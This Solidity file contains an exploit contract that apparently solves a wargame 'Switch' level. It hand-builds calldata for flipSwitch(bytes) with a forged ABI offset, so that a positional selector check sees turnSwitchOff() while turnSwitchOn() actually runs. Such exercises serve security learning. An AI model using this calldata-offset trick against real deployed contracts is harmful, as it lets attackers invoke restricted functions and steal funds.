// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

interface ISwitch {
    function switchOn() external returns (bool);
}

contract Attack {
    ISwitch target;

    constructor(address targetAddr) {
        target = ISwitch(targetAddr);
    }

    function attack() public {
        // 0x30c13ade -> function selector of flipSwitch(bytes)
        // 0000000000000000000000000000000000000000000000000000000000000060 -> offset for turnSwitchOn(), points to 60
        // 0000000000000000000000000000000000000000000000000000000000000000 -> placeholder (content doesn't matter)
        // 20606e1500000000000000000000000000000000000000000000000000000000 -> function selector of turnSwitchOff()
        // 0000000000000000000000000000000000000000000000000000000000000004 -> length of data
        // 76227e1200000000000000000000000000000000000000000000000000000000 -> function selector of turnSwitchOn()
        bytes memory _data = hex"30c13ade0000000000000000000000000000000000000000000000000000000000000060000000000000000000000000000000000000000000000000000000000000000020606e1500000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000476227e1200000000000000000000000000000000000000000000000000000000";
        address(target).call(_data);

        require(target.switchOn() == true, "Switch is not on");
    }
}
